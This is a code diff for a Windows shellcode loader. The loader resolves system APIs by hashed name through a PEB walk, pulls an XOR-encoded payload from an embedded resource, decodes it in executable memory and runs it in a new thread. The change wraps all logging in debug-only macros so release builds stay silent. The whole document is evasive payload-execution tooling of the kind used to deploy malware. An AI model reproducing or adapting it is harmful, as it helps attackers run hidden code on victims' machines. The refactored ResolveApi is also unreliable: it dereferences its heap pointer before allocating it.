@@ -9,10 +9,26 @@
 #define FVN_PRIME		(const unsigned int) 16777619
 #define LOCAL_HEAP		((PPEB)__readgsqword(0x60))->ProcessHeap
 
+#ifdef DEBUG
+#define INFO 			printf("[INFO] ")
+#define ERROR 			printf("[ERROR] ")
+#define DBG_PRINT(m,x) 		m; printf x
+#else
+#define INFO 
+#define ERROR 
+#define DBG_PRINT(m,x) 		do {} while (0)
+#endif
+
 HMODULE GetModuleAddress(DWORD hash);
 FARPROC GetSymbolAddress(HMODULE base, DWORD hash);
 
-VOID ResolveApi(PAPI instance) {
+PAPI ResolveApi() {
+
+	RtlAllocateHeap_t RtlAllocateHeap	= (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
+	DBG_PRINT(INFO, ("RtlAllocateHeap: %lx\n", RtlAllocateHeap));
+
+	PAPI instance = (PAPI)instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(API));
+	DBG_PRINT(INFO, ("API* instance: %lx\n", instance));
 
 	instance->win32.NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTALLOCATEVIRTUALMEMORY);
 	instance->win32.NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetSymbolAddress(GetModuleAddress(NTDLL), NTPROTECTVIRTUALMEMORY);
@@ -22,6 +38,9 @@ VOID ResolveApi(PAPI instance) {
 	instance->win32.SizeofResource = (SizeofResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), SIZEOFRESOURCE);
 	instance->win32.LoadResource = (LoadResource_t)GetSymbolAddress(GetModuleAddress(KERNEL10), LOADRESOURCE);
 	instance->win32.RtlAllocateHeap = (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
+	instance->win32.RtlFreeHeap = (RtlFreeHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLFREEHEAP);
+
+	return instance;
 }
 
 template<typename MTYPE> DWORD HashString(MTYPE string, SIZE_T length) {
@@ -47,12 +66,13 @@ HMODULE GetModuleAddress(DWORD hash) {
 
 		if (name) {
 			if (hash - HashString(name, wcslen(name)) == 0) {
+				DBG_PRINT(INFO, ("module %ls found\n", name));
 				return (HMODULE)mod->BaseAddress;
 			}
 		}
 		next = next->Flink;
 	}
-	printf("module (0x%lx) was not found\n", hash);
+	DBG_PRINT(ERROR, ("module (0x%lx) not found\n", hash));
 	return nullptr;
 }
 
@@ -75,31 +95,31 @@ FARPROC GetSymbolAddress(HMODULE base, DWORD hash) {
 			auto name = RVA(LPSTR, base, names[i]);
 
 			if (hash - HashString(name, strlen(name)) == 0) {
+				DBG_PRINT(INFO, ("function %s found\n", name));
 				return (FARPROC) RVA(PULONG, base, functions[ordinals[i]]);
 			}
 			continue;
 		}
-		printf("function (0x%lx) was not found\n", hash);
+		DBG_PRINT(ERROR, ("function (0x%lx) was not found\n", hash));
 		return nullptr;
 	}
 }
 
 int main() {
 
+	PAPI instance 		= { 0 };
 	HANDLE hThread 		= { 0 };
 	DWORD protect 		= { 0 };
 	LPVOID lpBuffer 	= { 0 };
 	NTSTATUS ntstatus 	= { 0 };
 	PRESOURCE resource 	= { 0 };
 
-	RtlAllocateHeap_t RtlAllocateHeap = (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
-	RtlFreeHeap_t RtlFreeHeap = (RtlFreeHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLFREEHEAP);
+	DBG_PRINT(INFO, ("resolving api\n"));
 
-	resource = (PRESOURCE)RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(PRESOURCE));
-	PAPI instance = (PAPI)RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(API));
+	instance = ResolveApi();
+	resource = (PRESOURCE)instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(PRESOURCE));
 
-	printf("resolving api\n");
-	ResolveApi(instance);
+	DBG_PRINT(INFO, ("allocating resource\n"));
 
 	resource		= (PRESOURCE) instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(RESOURCE));
 	resource->Id		= MAKEINTRESOURCEA(SHELLCODE);
@@ -107,31 +127,32 @@ int main() {
 	resource->Length	= instance->win32.SizeofResource(NULL, resource->Object);
 	resource->hGlobal 	= instance->win32.LoadResource(NULL, resource->Object);
 
-	printf("resource loaded, allocating\n");
+	DBG_PRINT(INFO, ("resource loaded, allocating\n"));
 
 	ntstatus = instance->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &lpBuffer, NULL, &resource->Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (NT_SUCCESS(ntstatus)) {
 
-		printf("copying resources to buffer\n");
+		DBG_PRINT(INFO, ("copying resources to buffer\n"));
 		x_memcpy(lpBuffer, resource->hGlobal, resource->Length);
 
-		printf("decipher\n");
+		DBG_PRINT(INFO, ("decipher\n"));
 		for (auto i = 0; i < resource->Length; i++) {
 			((PBYTE)lpBuffer)[i] ^= 0x0A;
 		}
 
-		printf("changing page protections\n");
+		DBG_PRINT(INFO, ("changing page protections\n"));
 		ntstatus = instance->win32.NtProtectVirtualMemory(NtCurrentProcess(), &lpBuffer, &resource->Length, PAGE_EXECUTE_READ, &protect);
 		if (NT_SUCCESS(ntstatus)) {
-			printf("creating thread\n");
+
+			DBG_PRINT(INFO, ("creating thread\n"));
 			hThread = instance->win32.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL);
 			instance->win32.NtWaitForSingleObject(hThread, FALSE, INFINITE);
 		} 	
 	}
-	RtlFreeHeap(LOCAL_HEAP, 0, resource);
-	RtlFreeHeap(LOCAL_HEAP, 0, instance);
+	instance->win32.RtlFreeHeap(LOCAL_HEAP, 0, resource);
+	instance->win32.RtlFreeHeap(LOCAL_HEAP, 0, instance);
 
-	printf("exit code: 0x%lx\n", ntstatus);
+	DBG_PRINT(INFO, ("exit code: 0x%lx\n", ntstatus));
 	return 0;
 }
 
